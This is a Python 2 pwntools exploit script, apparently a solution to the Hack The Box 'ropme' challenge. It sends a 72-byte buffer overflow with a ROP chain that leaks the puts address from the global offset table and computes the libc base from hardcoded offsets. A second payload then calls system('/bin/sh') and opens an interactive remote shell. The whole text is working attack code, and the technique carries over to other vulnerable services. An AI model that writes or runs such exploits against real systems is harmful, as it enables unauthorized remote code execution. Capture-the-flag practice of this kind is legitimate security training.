#/usr/bin/python2
#coding: utf-8
from pwn import *
import sys
host = str(sys.argv[1])
port = int(sys.argv[2])
p = remote(host,port)
payload = bytearray()
p.info("Leak libc address")
got_puts = p64(0x601018) # Global offset table puts address
plt_puts = p64(0x4004e0) # Procedure Linkage Table puts address
plt_main = p64(0x400626) # — — — — — — — — — — — — main address
pop_rdi = p64(0x4006d3) # pop function value rdi
overflow = 'A'*72
payload = overflow + pop_rdi + got_puts + plt_puts + plt_main
p.recvuntil('dah?\n')
p.sendline(payload)
leaked_puts = u64(p.recvuntil('\n').strip().ljust(8, '\x00'))
log.success("Leaked puts@GLIBC: 0x{:x}".format(leaked_puts))
p.info("Payload time")
libc_put = 0x06f690 # values ​​of function offset, found via search.
libc_sys = 0x045390
libc_sh = 0x18cd17
offset = leaked_puts - libc_put
real_sys = p64(libc_sys + offset)
real_sh = p64(libc_sh + offset)
payload = overflow + pop_rdi + real_sh + real_sys
p.recvuntil("dah?\n")
p.sendline(payload)
p.interactive()

#python2 ropme.py docker.hackthebox.eu portnumber